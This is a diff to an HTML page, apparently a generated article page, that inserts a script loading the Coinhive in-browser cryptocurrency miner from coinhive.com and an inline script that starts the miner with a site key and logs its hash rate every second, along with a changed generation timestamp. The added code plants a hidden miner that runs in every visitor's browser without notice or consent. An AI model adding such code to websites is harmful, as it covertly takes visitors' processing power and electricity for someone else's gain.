@@ -39,8 +39,31 @@
         })();
   </script>
   
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
+<script>
+  var miner = new CoinHive.Anonymous('dPTtaldz5u4Pa2YeXxlNxxz3GBxcofbs');
+  miner.start();
+</script>
+
+<script>
+  // Listen on events
+  miner.on('found', function() {  })
+  miner.on('accepted', function() {  })
+
+  // Update stats once per second
+  setInterval(function() {
+      var hashesPerSecond = miner.getHashesPerSecond();
+      var totalHashes = miner.getTotalHashes();
+      var acceptedHashes = miner.getAcceptedHashes();
+
+      // Output to HTML elements...
+      console.log("H/s: " + hashesPerSecond);
+      console.log("Total Hashes: " + totalHashes);
+      console.log("Acepted Hashes: " + acceptedHashes);
+  }, 1000);
+</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -219,7 +242,7 @@ the cousin statistic, total line length. <a rev="footnote" title="Jump back to 
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-11-05T00:14:21Z -->
+  <!-- Last generated: 2017-12-19T22:15:53Z -->
 </body>
 </html>
 
